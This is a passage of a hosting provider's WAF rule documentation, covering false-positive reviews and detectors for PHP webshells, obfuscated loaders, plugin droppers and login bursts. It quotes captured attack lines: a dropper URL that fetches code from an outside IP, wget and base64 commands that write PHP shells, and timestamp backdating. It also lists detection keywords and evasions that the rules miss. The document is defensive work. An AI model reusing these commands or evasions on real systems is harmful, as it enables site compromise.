`challenge_v2`, which an XHR cannot solve. Rare (a client polls only before
upgrading to websocket, or when websocket is blocked), but every Socket.IO
app can send it.

**Fix:** `0x1E` left 601's **body** scan. It is framing beyond Socket.IO:
Engine.IO v4 under any mount path, ASP.NET SignalR's JSON protocol (handshake
over long-polling / SSE included), RFC 7464 json-seq. A carve-out keyed on
`/socket.io` + `EIO=4` + `transport=polling` was rejected in review: it
missed those and custom paths. The query leg keeps the full byte set (none
of these protocols put `0x1E` there); every other control byte still counts.
Test: `scripts/tests/cfm_waf_ctrl_chars_record_separator_test.lua`.

**Decided: the query leg stays raw (no `%01` decoding).** Measured over the
8 edge nodes' access logs, 11-18 Nov, ~240 M requests: six queries carried an
encoded byte decoding would turn into a hit (`%01`-`%08`, `%0B`, `%0C`,
`%0E`-`%1F`), none an attack (GPTBot on a site's broken opensearch link; a
cPanel File Manager folder named with PNG header bytes). Decoding would add
challenges and catch nothing. The count misses request bodies and requests
nginx refuses itself (`access.bad_request.log`): re-measure before changing
it.

**Known limit:** Python's `str.split()` and Java's
`Character.isWhitespace()` treat `0x1C-0x1F` as whitespace, so
`union\x1eselect` in a body passes 301 and no longer trips 601. It matters
only to a Python / Java app tokenising that way; MySQL, PostgreSQL and the
shell do not, and `0x1C`, `0x1D`, `0x1F` still trip 601.

The rest of 601 in the same week (56 hits): 8 were the Optimization
Detective beacon under a language prefix (`/en/wp-json/…`, fixed), 47 came
from datacenter addresses (`Go-http-client` `POST /` with text bodies, Psiphon
`/inproxy-broker`). None was a visitor.

**Lesson:** a byte that is framing in a common protocol cannot be a payload
signal in a body; carve out the byte, not one app's path.

### Structural anti-patterns to check during rule review

Every one of these surfaced as a real FP above. Read new detector PRs with
them in hand.

| Anti-pattern | What to check | Case |
|---|---|---|
| Plain-substring match on a common word fragment (`onerror`, `onload`, `eval`, `system`) | Anchor on `%f[%w]` or equivalent | XSS (#2) |
| Length-based rule on the URI path | Does a CMS template inject `data:` URIs, `srcset=` strings or unquoted `url(…)` a crawler follows? | LONG_PATH (#1) |
| Generic "this isn't UTF-8" validator | Does it fire only on bypass primitives (overlong / surrogate / out-of-range), or on all non-UTF-8? | BAD_UTF8 (#3) |
| Protocol-scheme scanner over args/body | Which schemes do top WP / Joomla / Magento plugins store as config? | SSRF_FTP (#4) |
| Body-content scanner (code shapes, PHP openers, SQL keywords) | Which admin tooling writes this shape? Does the rule belong off `/wp-admin/`? | PHP_OPENER (#5) |
| Per-byte walker on body | Does it assume text? Multipart uploads carry arbitrary binary. | BAD_UTF8 (#3) |
| Rule that depends on buffer composition (e.g. `args + "&" + body`) | Tests pass complete, self-contained inputs, not rely on how the WAF concatenates args and body | BAD_UTF8 (#3, test 76) |

### Pre-merge checklist for a new detector

1. **Run on a captured production log.** Replay the rule against
   `cfm.waf.log` (or `access.log` if pre-WAF). Expect zero FPs at logonly
   over more than 24 h before promoting.
2. **Check `/wp-admin/` and `/wp-json/` traffic specifically.** Almost every
   FP above came through WP admin / REST. Carve out at the call site
   (cleanest) or with a per-vhost exclusion (operator-driven) rather than
   tightening the detector.
3. **Check bare-IP `host` traffic separately.** `WAF_IP_HOST` already catches
   it; another rule firing on the same requests double-challenges research
   scanners (Palo Alto Cortex Xpanse, Censys) at IP-only endpoints.
4. **Check Facebook + Instagram traffic.** AS32934 has its own crawler shapes
   (`facebookexternalhit`, in-app browser UAs), with URLs sometimes mangled by
   its link-preview infrastructure.
5. **For length / encoding / protocol-scheme rules, write the anti-pattern
   test first.** Take the most realistic legitimate input that could trip the
   rule (a multipart POST, a `data:` URI in the path, a `;base64,` body, a
   legacy ISO-8859-x form post) and assert it does not fire. Then the
   positive case.
6. **Start at `logonly`.** Promote only after `cfm webtop waf hit-rates`
   shows `ok_to_promote` (rate < 0.01%) over a representative window and the
   JSON log shows no host with a disproportionate hit count.

---

## Rule IDs

Every WAF rule has a stable numeric ID grouped by first digit:

| Group | Range | Family |
|---|---|---|
| 1xx | 100-199 | Path / traversal |
| 2xx | 200-299 | Client identity (UA) |
| 3xx | 300-399 | Injection (SQLi, XSS, RCE, b64, deserialization, XXE, shellshock, …) |
| 4xx | 400-499 | Upload / malware / obfuscation |
| 5xx | 500-599 | Auth abuse / brute force |
| 6xx | 600-699 | Header / protocol anomaly |
| 7xx | 700-799 | SSRF / external interaction |
| 8xx | 800-899 | Information disclosure / debug |
| 9xx | 900-999 | Reserved (future detectors) |

Stability rule: **never renumber** an existing ID. New rules get the next free slot in their semantic group. Drift between the Lua source of truth (`configs/lua/cfm_waf.lua`) and the Go mirror (`internal/webdetector/waf_rule_ids.go`) is caught by `TestWAFRuleIDs_LuaParity`.

The assignments themselves are not copied here (a copy drifted: it showed
block rules as logonly and missed 439, 440 and the CVE band). List them with
`cfm webtop waf rules` (`--json` for scripts) or `GET /api/v1/waf/rules`.

### Where IDs surface

- **WAF log line** — `cfm.waf.log` events carry `waf_rule_id=N` alongside the existing `reason=` field.
- **History persistence** — stored in `HistoryEvent.Payload["waf_rule_id"]` for forensic queries.
- **Behind-the-headline rules (`also_rule_ids`, 2026-10-06)** — `cfm.waf.log` and the history payload also carry `also_rule_ids`: the OTHER rules that matched the same request behind the headline (`cfm_waf.also_rule_ids`, distinct, ascending, at most 16; record-only, nothing enforces on them). Without it a logonly rule placed after a stronger one never appears anywhere: a 30-day fleet read (2026-10-06) found **zero** hits for 421-425 and 430-436/439, which run after 402 (block) and 404/437/438 (challenge). `GET /api/v1/waf/engine/summary?rule=<numeric id>&also=1` also matches events where the id is in `also_rule_ids` and reports how many as `also_matches` (without `also=1` a numeric filter stays headline-only, which the cfm-admin WAF page relies on); the MCP `waf_rule_detail` shows the split as `web_by_id {total_events, headline, also_matches}`. **Sampled, not exact:** the list rides the ip_push, and the edge sends at most one push per (IP, reason family, tier — and rule, on the block tier) per `push_cooldown` (60 s), so a rule matching behind the headline on 100 requests from one IP in a minute counts once. Read `also_matches` as a presence signal (does the rule fire at all, on which hosts/IPs), not a rate; an exact per-rule edge counter (a shdict `cfm_shdict.incr` per matched id, exposed via the bridge) is the follow-up if a promotion decision ever needs volumes. Residual: a rule after a **block** that short-circuits (`goto done`) is still never evaluated on that request, so it cannot appear in `also_rule_ids` either (cost design, see the autoblock decision record). The panel edge does not push, so it is web-only.
- **API** — `GET /api/v1/waf/rules` returns the registry with group / group_name / reason_family / default_mode.
- **Header lines** — the WAF reads up to `max_header_lines` (default 1000, never below 100) request header lines (`cfm_waf_util.waf_request_headers`); nginx forwards every line, so before 2026-10-09 a header past line 100 was invisible to the WAF. A request with more lines is logged as `[cfm] header_lines=over_max` (one line per IP a minute) and, under `max_header_lines_mode = "block"` (default `logonly` for burn-in), refused with `431` on the web edge / blocked as `WAF_HEADER_LINES` on the panel ports.
- **CLI** — `cfm webtop waf rules` prints the table grouped by family. `--json` for scripts.
- **Public Lua API** — `_M.get_rule_ids()` returns a copy of the `RULE_IDS` table; `_M.rule_id_for("rule_traversal")` looks up a single ID.

The `rule_id` field returned by the bridge's `/nginx/decision` endpoint is a **separate** namespace (decision-engine traffic-rule IDs, not WAF rule IDs). The WAF path uses `waf_rule_id` everywhere to avoid collision.

---

## Backdoor / obfuscation family (430-438)

Reason family **`WAF_BACKDOOR`**, in `_M.WAF_HIGH_RISK_REASONS`: a challenge
for a cleared client converts to block. The first set came from a captured
webshell (2026-05-19, `wp-content/themes/bridge/includes/radio.php`, a
char-pool-obfuscated PDF-polyglot loader). Each rule catches a different class
of evasion. Modes: 430-436 `logonly`, 437 `challenge_v2`, 438 `block` (armed,
6 h ban), 440 `block` with its ban held. Per-vhost exclusions apply as usual
(`cfm webtop waf exclude add /path --rule 430`).

### Rule 415 — `rule_upload_content_deep`

Family `WAF_UPLOAD_CONTENT`, **`block`** since 2026-11-24, its ban held per
rule (`HoldAutoblock`, `RULE_415 = 0`). 402's PHP / JSP openers (`<?php`, `<?=`
with a PHP expression after it, `<jsp:`) in uploaded **file** parts (a
`filename=`) past 402's 2 KB window: a webshell after 2 KB of image data, or
in a second file. Each part is read from its start, to the multipart budget
(16 KB). It also reads the `<?` short tag when code follows, which 402 does
not: 402 scans text fields too, and a ticket quoting `<? echo $title; ?>` is
no webshell. The tag names the file's extension (`UPLOAD_PHP_TAG_DEEP:<ext>`).

402 reads superglobal words only in file parts and only next to a PHP opener
in the same part (any `<?` but an XML-style PI PHP cannot parse:
`<?xml version=`, `<?xml-stylesheet`, `<?xpacket`, `<?mso-application` plus an
attribute; `<?xml:` is a goto label and counts; or `<script
language="php">`). So `$_POST` in a ticket or an attached `error.log` is no
402 FP; `<?php` / `<?=` alone still block anywhere in the window.

**Promotion (2026-11-24).** Logonly from 2026-10-09: these bytes were never
scanned before, and a text attachment quoting PHP would be a 6 h ban at block.
Two fleet reads before the promotion:
- 14 days to 2026-11-17: 2 hits, both media-library uploads by Greek admins,
  which the log could not name (hence the extension tag);
- the 7 days after: 1 hit, a `.png` carrying `<?php` POSTed to Bricksforge's
  `/wp-json/bricksforge/v1/form_file_upload` on novamotors.sa (orion), from
  Venezuela. Nothing landed (no new file under uploads, no Imunify hit).

At `block` the edge answers 403. The ban is held: `WAF_UPLOAD_CONTENT` is
armed by 402, and a ban for a real file that quotes PHP would be 6 h;
`RULE_415 = 1` arms it. Held, it runs late with the other held rules
(after every armed block rule), so a request 402 or an armed rule also catches
keeps that rule's headline and ban. Exempt on the same legit-archive
endpoints as 402. Why straight to block, and the panel ports: "Rule 417".

### Rule 430 — `rule_htaccess_poisoning`

**Matches** `.htaccess` / `.user.ini` uploads that flip a handler to PHP (the
escape from a "no .php upload" filter: upload `.htaccess`, then `shell.jpg`):
handler directives anchored on `x-httpd-php` (so font/media `AddType` lines do
not match), `auto_prepend_file` / `auto_append_file` (`php_value` or
`.user.ini` form), `Options +ExecCGI`. Tags `HTACCESS_{ADDTYPE,SETHANDLER,
ADDHANDLER}_PHP`, `HTACCESS_AUTO_{PREPEND,APPEND}`,
`USER_INI_AUTO_{PREPEND,APPEND}`, `HTACCESS_EXEC_CGI`.

**Stays `logonly`:** on shared hosting a hand-written `AddType
application/x-httpd-php .php` is legitimate, and the three Apache-directive
branches are not prose-gated like the `.user.ini` one, so a ticket discussing
the directive or a File Manager `.htaccess` edit matches. It is not gated by
`legit_archive_upload` either. Promotion waits for a prose gate (a
directive-shaped context, not the bare token) on those branches.

### Rules 431-436 — PHP obfuscation shapes

All `logonly`, all body scans.

| Rule | Matches | Tag | Why no legit code matches |
|---|---|---|---|
| 431 `rule_php_char_pool_obfuscation` | 3+ dot-concatenated indexed reads of the **same** variable (`$p[61].$p[7].$p[34]`, building `gzinflate`): FOPO / PHP-Obfuscator / Code-Eater output, where the function name never appears as a substring | `CHAR_POOL_BUILDER` | legit PHP reads arrays in a loop or with `implode` |
| 432 `rule_php_polyglot_full_body` | first 16 bytes are file magic (`%PDF-`, JPEG, PNG, GIF87a/89a, `PK\x03\x04`, `BM`, `RIFF`) and a PHP/JSP/script opener anywhere in the budget, not just 412's first 64 bytes | `POLYGLOT_DEEP_<PDF\|JPEG\|PNG\|GIF\|ZIP\|BMP\|RIFF>` | binary files do not contain `<?php` |
| 433 `rule_php_eval_loader_b64` | terminal `eval` / `assert` / `call_user_func[_array]` whose first argument is a variable-fed call (`eval($a($b("…")))`) plus a quoted literal ≥ 200 chars, ≥ 90 % base64 alphabet: the loader's transport, whatever built the names | `EVAL_LOADER_B64` | a literal-name `eval(base64_decode(…))` does not match (other rules cover it) |
| 434 `rule_php_superglobal_callable` | a superglobal invoked as the callable: `$_GET[…](`, `$_POST[…](`, `$_REQUEST[…](`, `$_COOKIE[…](`, `$_SERVER[…HTTP_…](` (the dominant post-2020 backdoor; no function is named) | `SG_<GET\|POST\|REQUEST\|COOKIE\|SERVER_HTTP>_CALL` | legit code uses superglobals as values or keys, never followed by `(` |
| 435 `rule_php_concat_funcname_eval` | `$a = "sys"."tem"; $a(…)`: pieces of 1-6 `[a-zA-Z_]` chars, the variable later called, not after `->` | `CONCAT_FUNCNAME_CALL` | the class excludes path/version concatenations; templates use `$obj->$method()` |
| 436 `rule_php_decode_chain` | 3 decoder calls (`base64_decode`, `gzinflate`, `gzuncompress`, `gzdecode`, `str_rot13`, `strrev`, `hex2bin`, `convert_uudecode`, `bzdecompress`, `pack`, each followed by `(`) within 300 bytes | `DECODE_CHAIN` | plugins and WP core (`wp-includes/pomo`) use them in separate functions, far apart |

431 / 433 cover hidden decoder names, 435 / 436 the literal, hand-rolled
forms.

**432 and `<?=`.** The 3-byte `<?=` collides with binary about once per ~16 MB
of image data: it fired 432 and 402 on product photos (the same save
alternated 200/403). `has_php_short_echo` now requires an expression after it
(optional `@`, then `$`, a backtick, a quote, `(`, or `name(` whose name may
hold digits). `<?=1` and the like are not webshell openers.

**432 stays `logonly`:** a challenge converts to block for a cleared client
(high-risk family), and the armed family can then 6 h-ban a logged-in customer
uploading a PDF that contains `<?php` through a raw-body endpoint (multipart
never trips 432: the body starts with the boundary). Promote only after
post-clearance-converted hits are excluded from the autoblock feed.

### Rules 437 / 438 — `rule_php_encoded_opener` (JS `\x` hex-escape) · `rule_php_encoded_opener_b64` (base64)

One detector, two ids by encoding (base64 checked first):

| Rule | Encoding | Bytes detected | Tag | Mode |
|---|---|---|---|---|
| **438** | base64 of `<?php` | `PD9waHA`, case-sensitive, at a base64 value boundary | `B64_PHP_OPENER` | `block` |
| **437** | JS `\x` hex escape | `\x3c\x3fphp` (lowercased body) | `JS_HEX_OPENER` | `challenge_v2` |

**Removed forms (audit F16).** URL (`%3C%3Fphp`), HTML-entity (`&lt;?php`) and
JS-unicode openers are how legit content travels: a urlencoded body encodes a
`<?php` typed into any field, rich-text editors escape pasted code, Go's
`encoding/json` escapes `<`. A marker-bearing payload in those encodings is
still caught by 404, which url-decodes the body. base64 `<?=` (`PD89`) is not
matched: a 4-char token, 6/6 FP in review.

**Why these two remain.** A browser never base64-encodes a form field, and the
boundary anchor drops mid-blob collisions (a product feed with base64-encoded
code samples, the class of rule 326's `rO0AB`); a real smuggled opener starts
its value (`?p=PD9waHA…`). A review found 16/16 base64 openers were botnet
POSTs to `/xmlrpc.php`. 437 is the only coverage for a markerless hex opener:
a form body cannot carry a literal `\x3c` (a backslash encodes as `%5C`), and
`normalize()` does not unwrap `\xNN`, so 404 never sees it.

**Scope.** Both are suppressed on `/wp-admin/*` (WPCode / Code Snippets post
base64 `<?php` there), except that 438 stays `logonly` on the pre-auth
`admin-ajax.php` / `admin-post.php` (audit F11, FP case 5). 438 went to
`block` on 2026-11-17 (14 hits in 7 days, all exploits: Bricks
`render_element`, WP Project Manager `pm/v2`).

The captured radio.php (PDF magic + char-pool + eval loader) trips
**431 + 432 + 433** at once.

---

## Rule 440 — `rule_plugin_dropper_cmd` (a fake plugin's command call)

Family **`WAF_BACKDOOR`**, tags `PLUGIN_CMD:DOWNLOAD` / `PLUGIN_CMD:RUN`,
**`block`** at the edge. Its `waf_security` ban and alert are **held in code**
(`HoldAutoblock`, `RULE_440 = 0`): `task=run` alone is the marker, and a page
can make a visitor's browser send it (an `<img>` src), which would plant a 6 h
node-wide ban on the visitor. `RULE_440 = 1` arms it. As a held block rule it
runs late in `cfm_waf.lua`, so it never shadows an armed rule's ban.

**Why.** The last step of a WordPress takeover (vol2.gr, titan; the same
operator in October): stolen login, a random-named plugin uploaded through
`update.php?action=upload-plugin`, then
`GET /wp-content/plugins/wp-m9xxwfjz24/wp-m9xxwfjz24.php?task=download&url=http://151.245.195.51/bog`
and `…?task=run`.

**Matches** a `.php` file (or PATH_INFO after one) under
`/wp-content/plugins/` or `/wp-content/mu-plugins/`, any depth and install
directory, whose `task` is `download` with a `url` field holding a URL, or
`run`. Fields read as PHP registers them (`php_request_fields`: query, and a
form body on a POST), every value, case and blanks ignored.

**FP evidence:** the October and November domlogs of seven nodes: no request
to a PHP file under those directories carried `task` outside these attacks.

**Not covered.** A theme's PHP file; another content directory (Bedrock's
`/app/plugins/`, a renamed `wp-content`); a directory index
(`/wp-content/plugins/x/?task=run`); another field name; a `url` without a
scheme (`151.245.195.51/bog`, `//host/x`) or no `url` (the URL inside the
dropper); a command in a header or cookie; a form body padded past
`waf_body_max_len` (32 KB), or read only in the body burn-in (chunked, no
Content-Length, over the read limit), where 440 is not enforced
(`BURNIN_ENFORCE_IDS`) and only logged: only the query is certain. The upload
itself is not refused: a logged-in upload is the administrator's own action,
as far as the edge can tell.

## Rule 331 — `rule_shell_write_exec` (a webshell terminal writing a dropper)

Family **`WAF_RCE`**, `logonly`, reasons `WAF_RCE:SHELL_FETCH_TO_EXEC`,
`WAF_RCE:SHELL_REDIRECT_TO_EXEC`, `WAF_RCE:SHELL_TOUCH_BACKDATE`.

**Why.** The tophair.gr backdoor (2026-10-08), a WPCode snippet serving a
terminal at `/?dark&term=1`, took commands as a POST form field:
`wget -q https://…/m.jpg -O wp-admin/css/colors/midnight/colors.php`,
`curl -o … .php`, `echo <base64> | base64 -d > upgrade.php`,
`touch -d '2025-07-10 20:39' g.php`. Rules 310-317 read the query only.

**Matches**, on the decoded, lowercased args and body (`get_norm_ab`), a
command at a command position (a value start, after `;` `|` `&` a backtick
`$(` or a newline, inside a JSON value or `sh -c '…'`), the verb optionally
behind a `…bin/` path or up to three prefix words (`sudo`, `nohup`, `env`,
`exec`, `command`, `busybox`, `nice`, `time`, `xargs`, an assignment such as
`HOME=/tmp wget`). It reads the surface as the shell would, quote-aware, with
JSON's escapes. The command must:

| Tag | Command |
|---|---|
| `FETCH_TO_EXEC` | `wget` / `curl` writing to an executable name: `-O` / `-o` (alone or ending a cluster), `--output`, `--output-document`, or the URL's own file name (`curl -O`, `wget` with no output option, not `--spider` / `--delete-after`). `-O -` is stdout (the `wget -q -O - …/wp-cron.php` cron line). |
| `REDIRECT_TO_EXEC` | `echo` / `printf` / `cat` / `base64` / `xxd` / `wget` / `curl` / `perl` / `python[3]` / `php` / `openssl` / `gzip` / `gunzip` with `>`, `>>`, `>\|`, `&>`, `&>>` to an executable name, or `tee [-a]` of one after a pipe. |
| `TOUCH_BACKDATE` | `touch` with `-d` / `-t` / `-r`, `--date` or `--reference` before its first operand. |

Executable names: rule 401's PHP set (`_cve_sfl_has_exec_ext`: `.php`,
`.php[0-9]*`, `.phtm[l]`, `.pht`, `.phar`) plus `.inc`, `.htaccess`,
`.user.ini`; only the last extension counts (`x.php.txt` is not).

**Why logonly.** Form values never carry these, but a tutorial in a ticket or
comment can, and so can staff saving a how-to post. There is deliberately no
logged-in / `/wp-admin/` exemption: colors.php lives under `/wp-admin/`, and
its planter holds an admin cookie. Over titan's access-log query strings
(2026-10-27: 1 263 vhosts, 2.03 M queries) it logged none; bodies are not in
those logs. `WAF_RCE` is armed for block hits only, so a 331 hit never bans.
Promote after a clean hit-rate review.

**Cost.** Plain finds, judged by the byte before; linear in the body. A body
naming no executable file reads `touch` only. Bounds: per command 4 KB, 32
words, 256 special bytes; per verb 64 commands a request. Measured alone:
under 1 µs on ordinary requests, ~100-160 µs on 19 KB naming `.php` and a
verb on every line, ~0.1-1.5 ms on a 32 KB body built against it (`check()`
itself costs ~5-10 ms on 19-32 KB).

**Not covered.**
- A real command behind 64 decoys of the same verb.
- The surface is lowercased, so wget's `-o` (log file) reads as `-O`:
  `wget -o log.txt URL/x.php` hides the download under the URL's name.
- Shell tricks: `w''get`, `$x`, `${IFS}`, `./wget`, a name built at run time,
  `cp` / `mv` of a fetched file, a prefix outside the list.
- PHP's own writers (`file_put_contents`): rules 404 / 433-436 judge PHP.

Tests: `scripts/tests/cfm_waf_shell_write_exec_test.lua`.

## Rules 332 and 416 — PHP code in the query, a PHP file as the body

**Why.** The dmkomotinis.gr Joomla compromise (earth, 2026-11-12). Fabrik
3.10's listfilter evaluates `<element>[value]` when `<element>[eval]=1`; the
attacker wrote `up.php` with
`…[value]=$h=fopen('up.php','w');fwrite($h,chr(60).chr(63)…)`, a dropper
writing `php://input` to `$_GET['f']`, then POSTed the 58 KB yavuzshell.php
to it as `application/octet-stream`. Every request reached the origin; the WAF
logged nothing. The Fabrik `[eval]` index itself is rule 10029 (`WAF_CVE`,
CVE-2026-67282, `block`, armed; `WAF_CVE.md`).

**Modes.** Both `block` since 2026-11-17, after a 7-day burn-in on the 8 edge
nodes:
- 332: 44 hits from 34 IPs, every one an exploit (ThinkPHP / ThinkCMF
  `file_put_contents`, pboot `{pboot:if(…)}`, Drupal `#post_render`, a CGI
  `TEMPLATE=…<?php system('id')`, Magento `/paypal/transparent/response/?<?=eval(…)`).
  `WAF_RCE` is armed: a 332 hit bans (6 h).
- 416: 289 hits from 269 IPs, every one an exploit (the PHPUnit
  `eval-stdin.php` sweep, a PUT dropper). Its ban was held per rule
  through a second burn-in and is armed since 2026-11-24 (74 hits from 66
  IPs in 5.5 days, all datacenter, 0 GR/CY): a 416 hit bans (6 h).
  `RULE_416 = 0` holds it again. Armed, it runs at step 60e again, before
  the held rules.

### Rule 332 — `rule_php_code_args`

Family **`WAF_RCE`**, reasons `WAF_RCE:PHP_ARGS_<TAG>`. **Matches**, per query
parameter (split on raw `&` as PHP does, `+` as space, url-decoded twice,
lowercased), a call to a file writer or code runner (`file_put_contents`,
`fopen`, `fwrite`, `fputs`, `file_get_contents`, `move_uploaded_file`,
`shell_exec`, `passthru`, `system`, `exec`, `proc_open`, `popen`,
`pcntl_exec`, `assert`, `eval`, `create_function`, `call_user_func[_array]`,
`include[_once]`, `require[_once]`, `curl_exec`; not a method, a static
method, a variable or part of a longer name) **together with** something only
PHP source carries, in the same parameter. The tag names it: `OPEN` (`<?php`,
`<?=`), `SUPERGLOBAL`, `DECODE` (`base64_decode(`, `hex2bin(`, `gzinflate(`,
…), `RETURN`, `ASSIGN` (`$x =`), `DYNAMIC_CALL` (`$x(`), `CONCAT` (`'…'.'…'`),
`CHR_CHAIN` (3+ `chr(`), `NAME_STRING` (a sink named in a string built from
pieces, then called through `$x(` or `)(`).

**Why both halves.** Each alone occurs in real traffic: a static page linking
`style.css?v=<?php echo rand(…); ?>` (Googlebot fetches it weekly), a search
for `operating system (linux)`, Oracle / Postgres SQLi with `CHR()`.

**FP evidence:** 7 days of edge `access.log` on all 8 edge nodes: ~150
matches from more than 10 exploit families (Fabrik, ThinkPHP, SPIP, Magento,
ThinkCMF, Drupal, pearcmd), no legitimate one. Replayed over dmkomotinis.gr's
raw log (1 386 queries) it matched every request of the chain that wrote a
file (39), not the probes (`1;`, `sleep(3);`). Expected noise: a search for
PHP code on a developer site. cPanel json-api / execute saves never reach it:
they pass the panel gate before the WAF (`cfm_panel_hosts.is_panel_api_or_sso`).

**Not covered.** The query only. Fabrik (like most of these apps) reads
`$_REQUEST`, so the same payload in a urlencoded body is not read by 332, and
404 needs a `<?`, `$_`, `eval`, `system` or `exec` marker that
`$h=fopen(…);fwrite($h,chr(…))` lacks. Reading form bodies needs editor
exclusions first: planned as a separate logonly rule (form fields, JSON string
values, cookies). **Order:** runs late, beside 331, so a payload that also
trips an armed block rule keeps that rule's headline.

Tests: `scripts/tests/cfm_waf_php_code_args_test.lua`.

### Rule 416 — `rule_php_file_body`

Family **`WAF_PHP_WEBSHELL_BODY`**, reasons
`WAF_PHP_WEBSHELL_BODY:BODY_IS_<KIND>_<CT>`. **Matches** a POST / PUT / PATCH
body that opens with `<?php` / `<?=` (after an optional BOM and blanks;
KIND `PHP_FILE`), or a `GIF87a` / `GIF89a` header with a PHP tag in the first
256 bytes (`GIF_POLYGLOT`). CT names the Content-Type class (`NONE`, `OCTET`,
`TEXT`, `FORM`, `JSON`, `XML`, `OTHER`). Multipart never matches (402's).

**Why shaped this way.** It tests the body's first bytes, not its label, so
relabelling the upload as a form does not help: a real form body opens with a
field name, JSON with `{` / `[`, XML with `<?xml` or an element. A form FIELD
holding PHP (`content=<?php …`) starts with its name and is not matched. A raw
body that IS a PHP file has no ordinary sender. 404 does not read
`application/octet-stream` and scores only 2 KB (yavuzshell.php's first
`eval` is at byte 4 077).

**Scope.** Bodies are read where cfm.lua reads them (a POST to any `*.php`; a
PUT / PATCH under the size and type gate). Skipped: a PUT / PATCH under
`/remote.php/` (Nextcloud / ownCloud sync uploads `.php` files raw), and a PUT
/ PATCH on a cPanel Web Disk host (`webdisk.<domain>`), only under Step 0d's
gates (`proxysubdomains=1`, `proxysubdomainsoverride=0`, a registrable
domain), since the Host is the client's.

**FP evidence:** the access log holds no Content-Type or body; the dropper's
footprint (a POST over 2 KB to a `*.php` with a `.php` name in its query)
matched only dmkomotinis.gr in 7 days. The burn-in above was the measurement.

### Rule 417 — `rule_php_webshell_body_deep`

Reason `WAF_PHP_WEBSHELL_BODY:DEEP_<404's tag>`, **`block`** since
2026-11-24, its ban held per rule (`HoldAutoblock`, `RULE_417 = 0`). 404 scores PHP in
a textual POST body over its first 2 KB only (`php_webshell_max_scan_len`).
Two compromises passed beyond it: a plugin-editor save with an eval of a
request header at line 32 (apolymanseisantoniou.gr, orion, 2026-11-15), and a
file manager saving a shell whose comment header fills the first 2 KB
(zerooneoliveoil.gr, rigel, 2026-11-17).

**Matches:** 404's scorer over the whole body the edge read
(`php_webshell_deep_scan_len`, 32 KB = `waf_body_max_len`), only when 404
scored nothing, and only after a cheap raw check finds a scorer marker
(`PHP_SCORE_MARKERS`) or an escape that may decode to one (`%3C`, `%3F`,
`%24`, `%5F`, `%25`, `\u00`; not `%20` / `%2F` / `%3D`, which are in nearly
every form). It also scores each multipart text field alone, as PHP hands it
over (file parts stay 402 / 415's), and decodes a JSON body's `\u00XX` / `\/`
escapes as `json_decode` does (404's head pass does not). A body within 2 KB
is read only where 404 could not read it as PHP gets it, or when 404 is off.
With `php_webshell_min_score` below 5 the raw check is off. **Residual:** a
score of 5 without `<?` / `$_` needs a callable or webshell name, and one
spelled with %-encoded letters is not read.

The same reviews fixed 404: it reads a body's media type as PHP does (an
urlencoded body with `multipart/form-data` in a Content-Type parameter was
read by neither rule), and its early-out admits `assert` / `popen` /
`proc_open`.

**Order.** Runs late, after every armed block rule (a held block evaluated
earlier would end the check before an armed rule's ban) and after the logonly
body rules (at step 15 it took the headline and the push from 331 on a
`wget || curl` dropper).

**Cost.** ~0.17 ms on a 20 KB form with no marker; nothing on a short body
404 already read; ~+0.4 ms on a 30 KB post with HTML; ~+5 ms on a 30 KB PHP
file saved through an editor (rare).

**Promotion (2026-11-24).** Logonly for a 7-day fleet burn-in on 8 nodes: 5
hits, every one an attacker, 0 false positives:
- kspk.gr (earth), twice: a Joomla tool posting `system($_GET…)` into each
  template's `error.php` through the template editor, then fetching
  `error_<rand>.php`. It had no admin session (every POST 302), and the
  files are unchanged;
- 2001.gr (earth): an `eval` POST to `com_ajax&plugin=helix3` from AWS, on a
  WordPress site (a blind spray).

The template-editor tool shows why logonly was not enough: with stolen
credentials its POST would have written the file. At `block` the edge answers
403. The ban is held, because a whole legitimate plugin file saved through an
editor still scores (a global `exec(` / `system(` plus a superglobal reaches
5), and that save must cost a 403, not a 6 h ban. Remedy for such a site: a
rule-scoped exclude on the editor path (`cfm webtop waf exclude add <path>
--type path --rule 417 --scope host`). `RULE_417 = 1` arms the ban. The code-editor and installer
endpoints the other body-PHP rules stand down for
(`is_known_legit_php_upload_endpoint`: Code Snippets and String Locator saves,
the plugin / theme installer) are exempt.

**Why straight to block, not challenge first** (the ladder is logonly →
challenge → block; 416, 332 and 10029 took the same exception on the same
kind of evidence), for 417 and 415 alike:
- every hit in the burn-in was an exploit tool, and none was a person;
- the requests are POSTs from scripts or XHR (an editor save, a form upload).
  A challenge page answers a script with HTML it never solves, and an XHR
  editor shows it as a failed save, so a challenge tier would not reveal a
  false positive any better than a 403 does;
- the ban is held, so a false positive costs one 403 on one request, never a
  6 h ban.

**Panel ports.** Block tier is enforced on `:2083/:2087/:2096` too
(`cfm_panel.lua`). cPanel File Manager saves and uploads pass without the WAF
(`is_panel_api_or_sso`; on `cpanel.X:443`, Step 0d). Roundcube is not on that
list, so an email over 2 KB that quotes PHP, or an attachment with PHP past
402's head, gets a 403. The 7-day read saw no hit on a webmail host; watch for
it, and remedy one with a rule-scoped exclude on the webmail host.

### Fleet read of 702, 10029 and 415 (2026-11-17, 14 days, 8 nodes)

| Rule | Hits | What they were | Decision |
|---|---:|---|---|
| 10029 Fabrik `[eval]` | 10 | all `EVAL_ZERO` (`[eval]=0`) from Greek users on three Fabrik sites (Fabrik's own form); `EVAL_ARG` only from the dmkomotinis attacker | **block**, armed (WAF_CVE): the first probe bans |
| 702 C2 tunnel | 355 | 176 `RENTRY` on `zort.me/shorten` (a URL shortener we host, the known FP source of 611); the rest comment spam with tunnel links, a Joomla `component/ajax` poller, `/wp-22.php?sfilecontent=<?php` writers | stays `challenge_v2`; `zort.me` needs a rule-scoped exclude (operator) |
| 415 upload deep | 2 | both `/wp-admin/async-upload.php` from Greek admins (media library) | stayed logonly; its tag now names the file's extension (`UPLOAD_PHP_TAG_DEEP:<ext>`). Promoted to block (ban held) on 2026-11-24, see "Rule 415" |

## Rule 501 — `rule_auth_burst` (login submissions)

Family `WAF_AUTH_BURST`, `challenge_v2`. Counts credential **submissions** per
IP across vhosts: `auth_burst_threshold` (8) in `auth_window_sec` (20 s), then
the rule's mode.

**Counts** a POST to a login endpoint whose body carries a password field,
read as PHP reads it (`php_request_fields`): WordPress `wp-login.php` `pwd`;
Drupal `/user/login` `pass`; Joomla `/administrator/index.php` `passwd`;
OpenCart `/admin/index.php` and custom `…/login` forms `password` / `pass` /
`pwd` / `passwd`; Magento `login[username]` + `login[password]` (on those, or
on its admin route alone); phpMyAdmin `pma_password` on a `phpmyadmin` path.
`route` / `_format` are read as PHP registers them (`%5Fformat`, `.format`;
the route after leading blanks, as OpenCart 4 trims it). A JSON body counts
